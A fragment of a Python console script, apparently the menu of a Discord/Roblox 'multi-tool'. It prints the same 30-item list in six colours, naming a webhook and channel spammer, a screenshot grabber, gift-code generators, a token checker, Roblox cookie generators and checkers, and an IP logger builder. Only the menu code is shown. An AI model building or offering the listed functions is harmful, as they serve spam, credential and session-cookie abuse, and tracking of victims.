            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |21. Discord Friend Scraper          |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |27. Github Username Sniper          |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
#________________
        if blue == True:
            
            time.sleep(delay)
            print(colorama.Fore.BLUE + f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |3. Credits And Info                 |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |5. Nitro Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |6. Webhook Checker                  |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |8. Token Checker                    |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |9. Proxy Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |10. Feedback                        |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |11. Roblox Cookie Generator         |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |13. Channel Spammer                 |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |14. Gui Color Changer               |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |15. Cookie Gen And Auto Checker     |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |21. Discord Friend Scraper          |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |27. Github Username Sniper          |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |------------------------------------|")
            
#________________
        if green == True:
            
            time.sleep(delay)
            print(colorama.Fore.GREEN + f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |3. Credits And Info                 |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |5. Nitro Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |6. Webhook Checker                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |8. Token Checker                    |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |9. Proxy Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |10. Feedback                        |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |11. Roblox Cookie Generator         |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |13. Channel Spammer                 |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |14. Gui Color Changer               |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |15. Cookie Gen And Auto Checker     |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |21. Discord Friend Scraper          |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |27. Github Username Sniper          |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
#________________
        if magenta == True:
            
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |3. Credits And Info                 |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |5. Nitro Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |6. Webhook Checker                  |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |8. Token Checker                    |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |9. Proxy Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |10. Feedback                        |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |11. Roblox Cookie Generator         |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |13. Channel Spammer                 |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |14. Gui Color Changer               |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |15. Cookie Gen And Auto Checker     |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |21. Discord Friend Scraper          |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |27. Github Username Sniper          |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |------------------------------------|")
#________________
        if yellow == True:
            
            print(colorama.Fore.YELLOW + f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |3. Credits And Info                 |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |5. Nitro Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |6. Webhook Checker                  |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |8. Token Checker                    |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |9. Proxy Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |10. Feedback                        |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |11. Roblox Cookie Generator         |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |13. Channel Spammer                 |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |14. Gui Color Changer               |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |15. Cookie Gen And Auto Checker     |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |21. Discord Friend Scraper          |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |27. Github Username Sniper          |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |------------------------------------|")
#________________
        if cyan == True:
            
            print(colorama.Fore.CYAN + f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |3. Credits And Info                 |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |5. Nitro Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |6. Webhook Checker                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |8. Token Checker                    |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |9. Proxy Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |10. Feedback                        |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |11. Roblox Cookie Generator         |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |13. Channel Spammer                 |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |14. Gui Color Changer               |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |15. Cookie Gen And Auto Checker     |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |21. Discord Friend Scraper          |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |27. Github Username Sniper          |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
#________________
        colorama.init()
        if color == "8":
            print(colorama.Fore.CYAN + "▼")
        if color == "1":
            print("▼")
        if color == "2":
            print(colorama.Fore.LIGHTRED_EX + "▼")
        if color == "3":
            print(colorama.Fore.RED + "▼")
        if color == "4":
            print(colorama.Fore.BLUE + "▼")
        if color == "5":
            print(colorama.Fore.GREEN + "▼")
        if color == "6":
            print(colorama.Fore.MAGENTA + "▼")
        if color == "7":
            print(colorama.Fore.YELLOW + "▼")
        really_main = input("")
        if really_main == "i1" or really_main == "I1" or really_main == "I 1" or really_main == "i 1":
            print("It Will Basicly Spam A Webhook")
            input("")
